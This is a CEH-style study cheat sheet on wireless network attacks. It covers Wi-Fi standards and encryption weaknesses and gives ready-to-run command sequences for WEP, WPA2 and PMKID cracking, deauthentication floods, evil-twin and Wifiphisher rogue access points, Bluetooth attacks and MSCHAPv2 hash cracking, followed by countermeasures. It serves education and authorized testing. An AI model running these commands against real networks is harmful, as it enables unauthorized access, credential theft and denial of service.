> For authorized security testing, red team exercises, and educational study only.

# Wireless Hacking (CEH v13 Module 16)

Quick reference for wireless network attacks, encryption weaknesses, and tooling used in penetration testing.

---

## Wireless Standards

| Standard | Frequency | Max Speed | Notes |
|----------|-----------|-----------|-------|
| 802.11a | 5 GHz | 54 Mbps | OFDM, shorter range |
| 802.11b | 2.4 GHz | 11 Mbps | DSSS, legacy |
| 802.11g | 2.4 GHz | 54 Mbps | OFDM, backward compat with b |
| 802.11n (WiFi 4) | 2.4/5 GHz | 600 Mbps | MIMO, channel bonding |
| 802.11ac (WiFi 5) | 5 GHz | 6.9 Gbps | MU-MIMO, 80/160 MHz channels |
| 802.11ax (WiFi 6/6E) | 2.4/5/6 GHz | 9.6 Gbps | OFDMA, TWT, BSS coloring |
| 802.11be (WiFi 7) | 2.4/5/6 GHz | 46 Gbps | 320 MHz channels, MLO, 4096-QAM |

**Channels:** 2.4 GHz has 14 channels (1-14), non-overlapping: 1, 6, 11. 5 GHz has 25+ channels (36-165). 6 GHz adds channels 1-233.

## Wireless Encryption

| Protocol | Cipher | Key | Weakness |
|----------|--------|-----|----------|
| WEP | RC4 | 40/104-bit | Static IV (24-bit), IV reuse, linear CRC-32 |
| WPA | TKIP (RC4) | 128-bit | MIC weakness, backward compat shim |
| WPA2 | CCMP (AES-128) | 128-bit | 4-way handshake offline brute-force, KRACK |
| WPA3 | GCMP-256 / SAE | 128/192-bit | Dragonblood side-channel attacks |

## Monitor Mode Setup

```bash
# Check wireless interfaces
iwconfig
iw dev

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Interface becomes wlan0mon

# Verify
iwconfig wlan0mon
# Mode: Monitor

# Manual method
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Return to managed mode
sudo airmon-ng stop wlan0mon
```

## Reconnaissance

```bash
# Scan all channels
sudo airodump-ng wlan0mon

# Target specific channel and BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Kismet (passive recon)
kismet -c wlan0mon

# Bettercap WiFi recon
sudo bettercap -iface wlan0mon
> wifi.recon on
> wifi.show
```

## WEP Cracking

```bash
# 1. Capture IVs (need ~40,000-85,000 for 64-bit, ~150,000 for 128-bit)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# 2. Generate traffic with ARP replay (speeds IV collection)
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# 3. Fake authentication (if no clients connected)
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# 4. Crack (uses FMS/KoreK/PTW attacks automatically)
sudo aircrack-ng wep_capture-01.cap
```

**Attack types:** FMS (statistical bias in RC4 key scheduling), KoreK (13 statistical attacks on RC4), PTW (fastest, needs ~40k packets for 64-bit key).

## WPA/WPA2 Cracking

```bash
# 1. Capture 4-way handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# 2. Deauth a client to force reconnection
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 3. Verify handshake captured (check top-right of airodump)

# 4. Dictionary attack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

# 5. Hashcat (GPU-accelerated) — convert cap to hccapx first
cap2hccapx wpa_capture-01.cap wpa_capture.hccapx
hashcat -m 2500 wpa_capture.hccapx /usr/share/wordlists/rockyou.txt

# PMKID attack (no client needed, no handshake needed)
# Capture PMKID from AP beacon
hcxdumptool -i wlan0mon -o pmkid_dump --enable_status=1
hcxpcapngtool -o pmkid_hash pmkid_dump
hashcat -m 22000 pmkid_hash /usr/share/wordlists/rockyou.txt
```

## WPA3 Attacks

```bash
# Dragonblood — side-channel and downgrade attacks against SAE
# CVE-2019-9494 (timing side-channel), CVE-2019-9496 (DoS)

# Downgrade attack: force WPA2 fallback on transition-mode APs
# SAE timing attack: leak info about password group element

# Tools
dragonslayer  # SAE implementation testing
dragondrain   # DoS against SAE handshake
dragontime    # Timing attack against SAE
dragonforce   # Password recovery from side-channel leaks
```

## Deauthentication Attack

```bash
# Single client deauth
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Broadcast deauth (all clients)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# mdk4 mass deauth
sudo mdk4 wlan0mon d -c 6
# Deauth all clients on channel 6

# Bettercap deauth
sudo bettercap -iface wlan0mon
> wifi.deauth AA:BB:CC:DD:EE:FF
```

## Rogue Access Point / Evil Twin

```bash
# hostapd-mana evil twin
cat > mana.conf << 'EOF'
interface=wlan1
ssid=FreeWiFi
channel=6
hw_mode=g
ieee80211n=1
mana_wpaout=hostapd_wpa.hccapx
EOF
sudo hostapd-mana mana.conf

# Bettercap evil twin
sudo bettercap -iface wlan0mon
> set wifi.ap.ssid FreeWiFi
> set wifi.ap.channel 6
> wifi.recon on
> wifi.ap on

# Wifiphisher (automated phishing)
sudo wifiphisher --essid "Corporate_WiFi" -p firmware-upgrade
```

**Karma attack:** AP responds to all probe requests regardless of SSID, luring clients that are probing for previously connected networks.

## Bluetooth Attacks

| Attack | Description |
|--------|-------------|
| BlueJacking | Sending unsolicited messages via OBEX push |
| BlueSnarfing | Unauthorized access to data (contacts, calendar, SMS) |
| BlueBugging | Full device control (calls, SMS, AT commands) |
| KNOB (Key Negotiation of Bluetooth) | Forces low-entropy session key (CVE-2019-9506) |

```bash
# Bluetooth scanning
hcitool scan
hcitool inq

# BLE sniffing with Ubertooth
ubertooth-btle -f -t AA:BB:CC:DD:EE:FF

# BLE enumeration
sudo bettercap -eval "ble.recon on"

# Spooftooph (profile cloning)
spooftooph -i hci0 -a AA:BB:CC:DD:EE:FF
```

## WiFi Automated Tools

```bash
# Wifite (automated wireless auditing)
sudo wifite --kill

# Fern WiFi Cracker (GUI)
sudo fern-wifi-cracker

# Airgeddon (multi-purpose)
sudo bash airgeddon.sh
```

## Enterprise Wireless (802.1X/EAP)

| EAP Method | Auth | Certificates | Security |
|------------|------|-------------|----------|
| EAP-TLS | Mutual TLS | Client + Server | Strongest (mutual cert auth) |
| PEAP | Server TLS + inner MSCHAPv2 | Server only | Vulnerable if client skips cert validation |
| EAP-TTLS | Server TLS + inner method | Server only | Similar to PEAP |
| EAP-FAST | PAC-based | Optional | Cisco proprietary |

```bash
# Evil twin attack against PEAP/MSCHAPv2
# hostapd-mana captures inner credentials
# Crack MSCHAPv2 hashes with asleap
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
```

## RF Jamming

Intentional interference with wireless signals by transmitting on the same frequency. **Illegal in most jurisdictions** (violates FCC Part 15, EU Radio Equipment Directive, etc.). Penalties include heavy fines and imprisonment. Covered in CEH for awareness only.

Types: constant, deceptive, random, reactive jamming.

## Countermeasures

- **Use WPA3** (SAE) where supported; WPA2-Enterprise with EAP-TLS as fallback
- **MAC filtering** is trivially bypassed (`macchanger -m AA:BB:CC:DD:EE:FF wlan0`)
- **Hidden SSID** does not provide security; SSID leaks in probe requests and association frames
- **WIDS/WIPS** (Wireless Intrusion Detection/Prevention): detect rogue APs, deauth floods, unusual traffic
- **Network segmentation**: isolate wireless from critical internal networks
- **Strong passphrases**: 12+ characters, not in common wordlists
- **Disable WPS**: vulnerable to brute-force PIN attack (Reaver/Bully)
- **802.1X with certificates**: prevents credential theft via evil twin
- **Client certificate validation**: prevent PEAP/TTLS credential capture
- **Regular audits**: scan for rogue APs, test signal leakage beyond physical perimeter

## Tips

- Always verify you have **written authorization** before testing wireless networks
- Use `airmon-ng check kill` before starting monitor mode to avoid process conflicts
- Channel hopping during airodump shows all APs; lock to target channel for capture
- PMKID attack works without clients connected -- test it first before deauth
- GPU cracking with hashcat is orders of magnitude faster than CPU-based aircrack-ng
- For WPA2, focus on weak passphrases -- cracking strong passwords is infeasible
- Not all wireless adapters support monitor mode and packet injection; Alfa AWUS036ACH is reliable
- Bluetooth attacks require physical proximity (typically <100m, often <10m for BLE)

## See Also

- `sheets/security/ids-ips.md` -- intrusion detection including WIDS

## References

- CEH v13 Module 16: Hacking Wireless Networks
- IEEE 802.11 Standards: https://standards.ieee.org/standard/802_11.html
- Aircrack-ng Documentation: https://www.aircrack-ng.org/documentation.html
- Dragonblood: https://wpa3.mathyvanhoef.com/
- KRACK Attacks: https://www.krackattacks.com/
- Hashcat Wiki: https://hashcat.net/wiki/
- WiFi Alliance WPA3 Specification: https://www.wi-fi.org/discover-wi-fi/security
